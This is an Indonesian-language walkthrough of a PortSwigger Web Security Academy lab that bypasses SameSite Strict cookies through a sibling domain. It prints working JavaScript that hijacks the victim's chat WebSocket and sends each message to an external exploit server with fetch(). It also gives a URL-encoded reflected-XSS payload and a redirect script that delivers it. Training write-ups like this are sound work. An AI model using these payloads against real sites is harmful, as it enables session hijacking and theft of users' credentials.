# SameSite Strict Bypass melalui Domain Sibling

Fitur live chat pada lab ini rentan terhadap Cross-Site WebSocket Hijacking (CSWSH). Untuk menyelesaikan lab ini, masuklah ke akun korban.

Untuk melakukan ini, gunakan server exploit yang disediakan untuk melakukan serangan CSWSH yang mengekstrak riwayat chat korban ke server Burp Collaborator default. Riwayat chat tersebut berisi kredensial login dalam teks biasa.

Jika Anda belum melakukannya, kami menyarankan untuk menyelesaikan topik kami tentang kerentanan WebSocket sebelum mencoba lab ini.

**Hint:** Pastikan untuk melakukan audit menyeluruh terhadap semua permukaan serangan yang tersedia. Perhatikan kerentanan tambahan yang mungkin membantu Anda dalam menyampaikan serangan, dan ingat bahwa dua domain dapat berada dalam situs yang sama.

---------------------------------------------

**Referensi:**

- [Bypassing SameSite Restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

- [Cross-Site WebSocket Hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/1.png)

---------------------------------------------
1.test chat dulu 
2.cari endpoint /chat dan cari ini:

https://0ab1001e04a27891802f1766000700f2.web-security-academy.net
wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat
https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net



3.cari dihistory burpsuite /resources/js/chat.js ,jika tidak ada kirim request sendiri contoh:

GET /resources/js/chat.js HTTP/2
Host: 0ab1001e04a27891802f1766000700f2.web-security-academy.net
Cookie: session=RInsjgHcRSwbqBvvzg3b6b6jF7mXNBgP
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab1001e04a27891802f1766000700f2.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,id;q=0.8
Priority: u=0, i


4.temukan coding yang yang menghandle messages yg dikirim dari server dan mengelola koneski:
           let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

            newWebSocket.onopen = function (evt) {
                writeMessage("system", "System:", "No chat history on record");
                newWebSocket.send("READY");
                res(newWebSocket);
            }

            newWebSocket.onmessage = function (evt) {
                var message = evt.data;

5.modifikasi codenya  menjadi seperrti ini:

<script>
  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");
  
  newWebSocket.onopen = function (evt) {
    newWebSocket.send("READY");
  };

  newWebSocket.onmessage = function (evt) {
    var message = evt.data;
    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + message);
  };
</script>

atau
 
<script>
  // Membuat koneksi WebSocket
  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");

  // Menangani event ketika WebSocket terbuka
  newWebSocket.onopen = function (evt) {
    console.log("WebSocket connection opened.");
    newWebSocket.send("READY");
  };

  // Menangani pesan yang diterima dari server
  newWebSocket.onmessage = function (evt) {
    let message = evt.data;
    console.log("Message received:", message);

    // Mengirim data ke server eksternal menggunakan fetch
    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + encodeURIComponent(message))
      .then(response => {
        if (!response.ok) {
          console.error("Failed to send data to exploit server:", response.statusText);
        } else {
          console.log("Data sent successfully to exploit server.");
        }
      })
      .catch(error => {
        console.error("Error occurred while sending data:", error);
      });
  };

  // Menangani event error WebSocket
  newWebSocket.onerror = function (evt) {
    console.error("WebSocket error occurred:", evt);
  };

  // Menangani event WebSocket ditutup
  newWebSocket.onclose = function (evt) {
    console.log("WebSocket connection closed:", evt);
  };
</script>


6.buka exploit dan kirim code tersebut ke victim dan lihat hasilnya:
![image](https://github.com/user-attachments/assets/1126c6bc-537a-43aa-880d-d68171b6be2c)

![image](https://github.com/user-attachments/assets/21d7d3c3-eb62-40ce-a028-377a97087a45)

7.kita lanjut ke tahap selanjutnya dengan mengexplore url ini:
https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net
![image](https://github.com/user-attachments/assets/1224fd68-3c9c-402c-8c19-da359217aa79)

![image](https://github.com/user-attachments/assets/4c05d559-3098-4778-b7c2-476136959526)

bisa kita lihat diatas jika kita memasukkan user dan password maka akann ditampilkan dihalaman depan,kemungkinan besar terdapat kerentanan xss
![image](https://github.com/user-attachments/assets/8de18b1e-be92-493b-ad2d-a33dc0c4eaa0)
![image](https://github.com/user-attachments/assets/d9c6197c-17ca-4df8-8460-ef8cce8cca1b)

7.cari url ini dibupsuite lalu kirim ke reapter :https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login
![image](https://github.com/user-attachments/assets/0f11b05e-d983-451e-a09c-289bae0127b8)

8.lalu ubah ke method get,lalu encode code pada tahap ke 5 menjadi url dan gabungkan dengan url tersebut:

![image](https://github.com/user-attachments/assets/1fe7a1c4-463d-4da3-8816-18842dd598ff)

https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%62%31%30%30%31%65%30%34%61%32%37%38%39%31%38%30%32%66%31%37%36%36%30%30%30%37%30%30%66%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%3b%0a%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%31%31%30%30%62%31%30%34%35%36%37%38%30%61%38%30%30%38%31%36%36%31%30%31%36%66%30%30%32%33%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%64%61%74%61%3d%22%20%2b%20%6d%65%73%73%61%67%65%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=ddadad

<script>
  let newWebSocket = new WebSocket("wss://0ab1001e04a27891802f1766000700f2.web-security-academy.net/chat");
  
  newWebSocket.onopen = function (evt) {
    newWebSocket.send("READY");
  };

  newWebSocket.onmessage = function (evt) {
    var message = evt.data;
    fetch("https://exploit-0a1100b10456780a80081661016f0023.exploit-server.net/exploit?data=" + message);
  };
</script>


9.lalu ubah jadi sperti ini :
<script>
document.location = "https://cms-0ab1001e04a27891802f1766000700f2.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%62%31%30%30%31%65%30%34%61%32%37%38%39%31%38%30%32%66%31%37%36%36%30%30%30%37%30%30%66%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%3b%0a%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%20%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%31%31%30%30%62%31%30%34%35%36%37%38%30%61%38%30%30%38%31%36%36%31%30%31%36%66%30%30%32%33%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%64%61%74%61%3d%22%20%2b%20%6d%65%73%73%61%67%65%29%3b%0a%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=ddadad"
</script>

![image](https://github.com/user-attachments/assets/ad500fe0-106d-4f14-a30e-92c00d87e73a)
